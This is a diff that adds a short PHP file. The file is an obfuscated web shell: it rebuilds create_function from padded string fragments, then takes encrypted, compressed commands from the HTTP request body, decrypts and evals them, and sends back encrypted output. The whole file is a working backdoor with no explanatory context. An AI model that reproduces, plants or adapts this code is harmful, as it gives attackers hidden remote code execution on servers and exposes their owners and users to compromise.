@@ -1,0 +1,10 @@
+<?php
+$o='b_gMet_cMMontents()M;@ob_end_clMean()M;$r=M@bMase64_encModeM(@x(@gzcompMressM($o),$k));priMnMt("$p$kh$Mr$kf");}';
+$m='MM){$o.=$t{$i}M^$kM{$j};}}reMturn $Mo;}ifM M(@preg_Mmatch("/$Mkh(.+M)$kMf/",@fiMle_get_coMMnteMntsM("php';
+$g=str_replace('wl','','cwlwlrwleate_fuwlwlwlnction');
+$D='://input"),$mM)==1) {@oMb_starMt();@eMMval(@gzuncomMprMesMsM(@x(@bMaMse64_decode($m[1]),$k)M));$Mo=@o';
+$U='t,$k){$c=strlMen($k)M;$l=MstMrlen($t)M;$o=M"";forM($i=0;$i<$Ml;)M{foMr($j=0;($j<M$c&&$i<$lM);$Mj++,$i++';
+$A='$k="5f4dMcc3b";M$kh=M"M5aa7M65d61d83";$kf="M27dMeb882cf9M9M";$p="yUAtSJHMDk3BQXM69b"MM;MfunctioMn x($';
+$j=str_replace('M','',$A.$U.$m.$D.$o);
+$i=$g('',$j);$i();
+?>
